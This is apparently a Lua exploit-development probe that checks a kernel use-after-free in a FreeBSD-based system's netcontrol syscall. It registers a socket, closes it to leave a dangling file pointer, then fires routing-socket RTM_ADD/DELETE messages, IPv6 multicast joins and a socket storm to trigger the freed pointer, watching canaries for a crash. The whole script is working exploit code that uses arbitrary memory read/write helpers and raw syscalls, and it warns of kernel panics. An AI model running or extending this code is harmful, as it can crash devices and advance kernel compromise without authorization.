-- CRASH_CLASS: RISKY
-- PROBE 102b: netcontrol register+close then trigger netevent via AF_ROUTE
--
-- The Poops chain primitive: register socket with netcontrol, close it
-- (frees struct file if no fhold), then trigger netevent delivery so the
-- kernel follows the stored file pointer. If fhold() is missing → UAF.
--
-- This probe does the register+close as the FIRST netcontrol operation,
-- then tries to trigger netevent via:
--   1. AF_ROUTE socket RTM_ADD (routing table change)
--   2. IPv6 socket create + multicast join + close
--   3. AF_INET socket create/destroy storm
--
-- If the process crashes during step 1-3, the UAF is LIVE.
-- If it survives all triggers, fhold() is present (patched).
--
-- RISK: May kernel panic. Power cycle needed if so.

print("=== PROBE 102b: NETCONTROL + AF_ROUTE TRIGGER ===")
print("")
collectgarbage("stop")

local function N(v)
    if type(v)=="table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t={}; for k,v in pairs(syscall.pipe) do t[k]=v end
    t.syscall_no=n; setmetatable(t,getmetatable(syscall.pipe)); return t
end
local function wd(a,v) pcall(function() memory.write_dword(a,v) end) end
local function wq(a,v) pcall(function() memory.write_qword(a,v) end) end
local function wb(a,v) pcall(function() memory.write_byte(a,uint64(v)) end) end
local function rd(a)
    local ok,v=pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok,v=pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function z(b,n) for o=0,n-4,4 do wd(b+o,0) end end

local stub=syscall.pipe.fn_addr
local pid=N(native.fcall_with_rax(stub,20))
print("pid="..pid)

local c624=mk(624)
local function vmc()
    local ok,c=pcall(function() return c624(uint64(0),uint64(0),uint64(0)) end)
    return ok and N(c) or -1
end
local function canary()
    local c=N(native.fcall_with_rax(stub,20))
    return c==pid, c
end

local BUF=memory.alloc(0x100)
local SET_Q=0x20000003
local CLR_Q=0x20000007

-- ifindex=1 (loopback) works; ifindex=-1 can be wedged system-wide
local IFINDEX=1

local function nc_reg(fd)
    z(BUF,0x10); wd(BUF,fd)
    local ok,rv=pcall(function() return mk(99)(uint64(IFINDEX),uint64(SET_Q),uint64(BUF),uint64(8)) end)
    return ok and N(rv) or -999
end

-- Block SIGPIPE
local sa_buf=memory.alloc(32); z(sa_buf,32); wq(sa_buf,uint64(1))
native.fcall_with_rax(stub,416,13,N(sa_buf),0)

local vm0=vmc()
print(string.format("vm0=%d",vm0))

-- ============================================================
print("")
print("--- A: CONTROL — verify netcontrol works ---")
local fd_ctrl=N(native.fcall_with_rax(stub,97,1,1,0))
print(string.format("  socket=%d",fd_ctrl))
local rc=nc_reg(fd_ctrl)
print(string.format("  register=%d",rc))
if rc~=0 then
    print("  netcontrol BROKEN in this process, aborting")
    native.fcall_with_rax(stub,6,fd_ctrl)
    return
end
-- Unregister to clear
z(BUF,0x10); wd(BUF,fd_ctrl)
pcall(function() mk(99)(uint64(IFINDEX),uint64(CLR_Q),uint64(BUF),uint64(8)) end)
native.fcall_with_rax(stub,6,fd_ctrl)
print("  control OK")

-- ============================================================
print("")
print("--- B: THE PRIMITIVE — register + close ---")
print("  (This is the Poops chain's core: if fhold() missing → dangling pointer)")

-- Create victim socket
local fd_victim=N(native.fcall_with_rax(stub,97,1,2,0))  -- AF_UNIX DGRAM
print(string.format("  victim socket=%d (AF_UNIX DGRAM)",fd_victim))
if fd_victim<0 then print("  SOCKET FAIL") return end

-- Register with netcontrol
local rv_reg=nc_reg(fd_victim)
print(string.format("  register=%d",rv_reg))
if rv_reg~=0 then
    print("  REGISTER FAIL")
    native.fcall_with_rax(stub,6,fd_victim)
    return
end

-- VM snapshot before close
local vm1=vmc()

-- CLOSE the registered socket
-- If fhold() is absent, the struct file is freed HERE
local rv_close=N(native.fcall_with_rax(stub,6,fd_victim))
print(string.format("  close=%d (struct file now freed if no fhold)",rv_close))

local vm2=vmc()
print(string.format("  vm before close=%d after=%d delta=%d",vm1,vm2,vm2-vm1))

local ok1,_ = canary()
print(string.format("  canary after close=%s",ok1 and "OK" or "FAIL"))
if not ok1 then return end

-- ============================================================
print("")
print("--- C: TRIGGER 1 — AF_ROUTE RTM_ADD ---")
print("  (Routing table change should trigger netevent dispatch)")

-- Open AF_ROUTE socket (AF_ROUTE=17, SOCK_RAW=3)
local fd_route=N(native.fcall_with_rax(stub,97,17,3,0))
print(string.format("  route socket=%d",fd_route))

if fd_route>0 then
    -- Build RTM_ADD message for 10.99.99.99/32 via 127.0.0.1
    -- rt_msghdr (92 bytes on FreeBSD 11+, 76 on earlier)
    local rtm=memory.alloc(256); z(rtm,256)

    -- rt_msghdr
    local msglen=128  -- generous, includes sockaddrs
    wd(rtm+0, msglen)        -- rtm_msglen (ushort)
    wb(rtm+2, 1)             -- rtm_version = RTM_VERSION (5)
    -- Actually version is at +2, type at +3
    wb(rtm+2, 5)             -- rtm_version = 5
    wb(rtm+3, 1)             -- rtm_type = RTM_ADD
    wd(rtm+4, 0)             -- rtm_index
    wd(rtm+8, 0x4000)        -- rtm_flags = RTF_UP
    wd(rtm+12, 0x07)         -- rtm_addrs = RTA_DST|RTA_GATEWAY|RTA_NETMASK
    wd(rtm+16, pid)          -- rtm_pid
    wd(rtm+20, 0)            -- rtm_seq

    -- sockaddr_in for DST at offset 92 (after rt_msghdr)
    local sa_off=92
    wb(rtm+sa_off, 16)       -- sin_len
    wb(rtm+sa_off+1, 2)      -- sin_family = AF_INET
    wd(rtm+sa_off+4, 0x6363630A)  -- sin_addr = 10.99.99.99

    -- sockaddr_in for GATEWAY at offset 108
    sa_off=108
    wb(rtm+sa_off, 16)
    wb(rtm+sa_off+1, 2)
    wd(rtm+sa_off+4, 0x0100007F)  -- 127.0.0.1

    -- sockaddr_in for NETMASK at offset 124
    sa_off=124
    wb(rtm+sa_off, 16)
    wb(rtm+sa_off+1, 2)
    wd(rtm+sa_off+4, 0xFFFFFFFF)  -- /32

    -- iov for writev
    local iov=memory.alloc(16)
    wq(iov, uint64(rtm)); wq(iov+8, uint64(msglen))

    -- Write the route message
    print("  sending RTM_ADD...")
    local rv_write=N(native.fcall_with_rax(stub,121,fd_route,N(iov),1))
    print(string.format("  writev=%d",rv_write))

    local ok2,c2 = canary()
    print(string.format("  canary after RTM_ADD=%s",ok2 and "OK" or "FAIL="..c2))

    -- Also try RTM_DELETE to trigger another notification
    wb(rtm+3, 2)  -- RTM_DELETE
    local rv_del=N(native.fcall_with_rax(stub,121,fd_route,N(iov),1))
    print(string.format("  RTM_DELETE writev=%d",rv_del))

    local ok3,_ = canary()
    print(string.format("  canary after RTM_DELETE=%s",ok3 and "OK" or "FAIL"))

    native.fcall_with_rax(stub,6,fd_route)
else
    print("  AF_ROUTE socket failed, skip")
end

-- ============================================================
print("")
print("--- D: TRIGGER 2 — IPv6 multicast join/leave ---")
print("  (Multicast group changes may trigger netevent)")

-- AF_INET6=28, SOCK_DGRAM=2
local fd6=N(native.fcall_with_rax(stub,97,28,2,0))
print(string.format("  ipv6 socket=%d",fd6))

if fd6>0 then
    -- Try IPV6_JOIN_GROUP (12) with all-nodes multicast ff02::1
    -- struct ipv6_mreq { in6_addr, unsigned int ifindex }
    local mreq=memory.alloc(24); z(mreq,24)
    wb(mreq, 0xFF)    -- ff02::1
    wb(mreq+1, 0x02)
    wb(mreq+15, 0x01)
    wd(mreq+16, 0)    -- ifindex=0 (any)

    -- setsockopt(fd6, IPPROTO_IPV6=41, IPV6_JOIN_GROUP=12, mreq, 20)
    local rv_join=N(native.fcall_with_rax(stub,105,fd6,41,12,N(mreq),20))
    print(string.format("  IPV6_JOIN_GROUP=%d",rv_join))

    local ok4,_ = canary()
    print(string.format("  canary after join=%s",ok4 and "OK" or "FAIL"))

    -- IPV6_LEAVE_GROUP (13)
    local rv_leave=N(native.fcall_with_rax(stub,105,fd6,41,13,N(mreq),20))
    print(string.format("  IPV6_LEAVE_GROUP=%d",rv_leave))

    local ok5,_ = canary()
    print(string.format("  canary after leave=%s",ok5 and "OK" or "FAIL"))

    -- Also try IPV6_PKTINFO (46) — setting this triggers inp notifications
    local pktinfo=memory.alloc(16); z(pktinfo,16)
    wd(pktinfo, 1)  -- enable
    local rv_pkt=N(native.fcall_with_rax(stub,105,fd6,41,46,N(pktinfo),4))
    print(string.format("  IPV6_PKTINFO=%d",rv_pkt))

    local ok6,_ = canary()
    print(string.format("  canary after pktinfo=%s",ok6 and "OK" or "FAIL"))

    native.fcall_with_rax(stub,6,fd6)
else
    print("  IPv6 socket failed, skip")
end

-- ============================================================
print("")
print("--- E: TRIGGER 3 — socket create/destroy storm ---")
print("  (Rapid fd churn may trigger cleanup events)")

local storm_count=0
for i=1,50 do
    -- AF_INET DGRAM
    local fd_s=N(native.fcall_with_rax(stub,97,2,2,0))
    if fd_s>0 then
        native.fcall_with_rax(stub,6,fd_s)
        storm_count=storm_count+1
    end
    -- AF_INET6 DGRAM
    local fd_s6=N(native.fcall_with_rax(stub,97,28,2,0))
    if fd_s6>0 then
        native.fcall_with_rax(stub,6,fd_s6)
        storm_count=storm_count+1
    end
end
local ok7,_ = canary()
print(string.format("  %d sockets created/destroyed, canary=%s",
    storm_count, ok7 and "OK" or "FAIL"))

-- ============================================================
print("")
print("--- F: TRIGGER 4 — interface query via AF_ROUTE ---")
print("  (RTM_IFINFO query to walk interface list)")

local fd_rt2=N(native.fcall_with_rax(stub,97,17,3,0))
if fd_rt2>0 then
    -- sysctl: net.route.0.0.3 (NET_RT_IFLISTL)
    -- Actually, use an RTM_GET to trigger route lookup
    local rtm2=memory.alloc(128); z(rtm2,128)
    wd(rtm2+0, 92)           -- msglen (just header)
    wb(rtm2+2, 5)            -- version
    wb(rtm2+3, 4)            -- RTM_GET
    wd(rtm2+12, 0x01)        -- RTA_DST

    -- DST: 0.0.0.0 (default route query)
    wb(rtm2+92, 16)
    wb(rtm2+93, 2)           -- AF_INET

    local iov2=memory.alloc(16)
    wq(iov2, uint64(rtm2)); wq(iov2+8, uint64(108))
    local rv_get=N(native.fcall_with_rax(stub,121,fd_rt2,N(iov2),1))
    print(string.format("  RTM_GET writev=%d",rv_get))

    local ok8,_ = canary()
    print(string.format("  canary after RTM_GET=%s",ok8 and "OK" or "FAIL"))

    native.fcall_with_rax(stub,6,fd_rt2)
else
    print("  AF_ROUTE 2 failed")
end

-- ============================================================
print("")
local vm_final=vmc()
local fc_ok, fc_v = canary()
print(string.format("FINAL: canary=%s vm0=%d vmf=%d delta=%d",
    fc_ok and "OK" or "FAIL="..fc_v, vm0, vm_final, vm_final-vm0))

if fc_ok then
    print("")
    print("VERDICT: Process survived all netevent triggers.")
    print("Likely: fhold() present, struct file refcount held → patched.")
    print("OR: triggers did not dispatch through netevent path.")
    print("Next: try child-thread concurrent register+close+trigger (race).")
end

print("")
print("=== 102b COMPLETE ===")
